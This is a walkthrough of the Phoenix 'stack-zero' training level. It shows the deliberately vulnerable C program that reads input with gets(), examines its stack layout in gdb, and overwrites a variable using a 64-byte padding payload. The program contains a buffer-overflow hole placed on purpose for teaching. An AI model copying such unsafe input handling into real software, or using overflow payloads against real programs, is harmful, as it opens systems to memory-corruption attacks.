## Stack Zero
This level introduces the concept that memory can be accessed outside of its allocated region, how the stack variables are laid out, and that modifying outside of the allocated memory can modify program execution.

## Source Code
```c
/*
 * phoenix/stack-zero, by https://exploit.education
 *
 * The aim is to change the contents of the changeme variable.
 *
 * Scientists have recently discovered a previously unknown species of
 * kangaroos, approximately in the middle of Western Australia. These
 * kangaroos are remarkable, as their insanely powerful hind legs give them
 * the ability to jump higher than a one story house (which is approximately
 * 15 feet, or 4.5 metres), simply because houses can't can't jump.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

char *gets(char *);

int main(int argc, char **argv) {
  struct {
    char buffer[64];
    volatile int changeme;
  } locals;

  printf("%s\n", BANNER);

  locals.changeme = 0;
  gets(locals.buffer);

  if (locals.changeme != 0) {
    puts("Well done, the 'changeme' variable has been changed!");
  } else {
    puts(
        "Uh oh, 'changeme' has not yet been changed. Would you like to try "
        "again?");
  }

  exit(0);
}
```
> For those unfamiliar with the `volatile` keyword, it tells the compiler not to run optimizations on the integer `changeme`.
## Challenge
The aim is to change the contents of the changeme variable.

## Solution
### Dry Run
```console
user@phoenix-amd64:~$ /opt/phoenix/amd64/stack-zero
Welcome to phoenix/stack-zero, brought to you by https://exploit.education
vi11ain
Uh oh, 'changeme' has not yet been changed. Would you like to try again?
```
As in the source-code,
1. Print banner with `puts()`
2. Receive user input to `locals.buffer` using `gets()`
3. Check `locals.changeme` and print output using `puts()` accordingly

### The Plan
Using `gets()` for user input is a dangerous practice,
> Never use gets().
> Because it is impossible to tell without knowing the data in advance how many characters gets() will read, and because gets() will continue to store characters past the end of the buffer, it is extremely dangerous to use.
> -gets(3), man

We can leverage it for a buffer overflow, running over, and changing, the value of `locals.changeme`.

### Debugging
This level is very straight forward and does not require debugging, but we'll use `gdb` just to make sure we understand what happens.
```console
user@phoenix-amd64:~$ gdb /opt/phoenix/amd64/stack-zero
```

I like to start by listing functions and putting a breakpoint in `main()`.
```console
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x0000000000400408  _init
0x0000000000400430  gets@plt
0x0000000000400440  puts@plt
0x0000000000400450  exit@plt
0x0000000000400460  __libc_start_main@plt
0x0000000000400470  _start
0x0000000000400486  _start_c
0x00000000004004b0  deregister_tm_clones
0x00000000004004e0  register_tm_clones
0x0000000000400520  __do_global_dtors_aux
0x00000000004005b0  frame_dummy
0x00000000004005dd  main
0x0000000000400630  __do_global_ctors_aux
0x0000000000400672  _fini
(gdb) b main
Breakpoint 1 at 0x4005e1
```

Now we can run the executable.

![](/images/stack-0/0.png)
Notice we approach the first call to `puts()`.

Add a breakpoint to after the call and continue until it.
```console
(gdb) b *main+25
Breakpoint 6 at 0x4005f6
```

![](/images/stack-0/1.png)
1. `0` is written to the `dword` (4 bytes) pointed by `[rbp-0x10]`, on the stack, this is `locals.changeme`
2. The address of `[rbp-0x50]`, `locals.buffer`, is moved to the register `rdi` (by convention in x64, this register acts as the first integer/pointer parameter to a function)
3. `gets(locals.buffer)` is called
5. And finally, we can see the check for `[rbp-0x10]`, `locals.changeme != 0`.

Use `GEF`'s `hexdump` to see the value of our variables in the stack.

![](/images/stack-0/2.png)

### Breaking it

So if we write more than 64 bytes (the size of `locals.buffer`) we will overwrite `locals.changeme` with a value of our choice.

We are not going to type 64 bytes by ourselves, this is what we have computers for,
```console
user@phoenix-amd64:~$ python3 -c "with open('exploit', 'wb') as f: f.write(b'a'*64 + b'\xDE\xAD\xBE\xEF')"
user@phoenix-amd64:~$ hexdump -C exploit
00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
*
00000040  de ad be ef                                       |....|
00000044
```
This input will write 64 `a` chars to fill `locals.buffer`, and a special `dword` - `0xDEADBEEF` to `locals.changeme`.

Re-run the program, this time with our payload redirected to it's `stdin`.
But before we do so, clear the breakpoints and set a new one to after `gets(locals.buffer)`.
```console
(gdb) d breakpoints
(gdb) b *main+44
Breakpoint 7 at 0x400609
(gdb) run < /home/user/exploit
```

Now `hexdump` once again just to check our input worked as expected.

![](/images/stack-0/3.png)

Continue (`c`) to let the program resume execution.
```console
(gdb) c
Continuing.
Well done, the 'changeme' variable has been changed!
[Inferior 1 (process 930) exited normally]
```

🥳
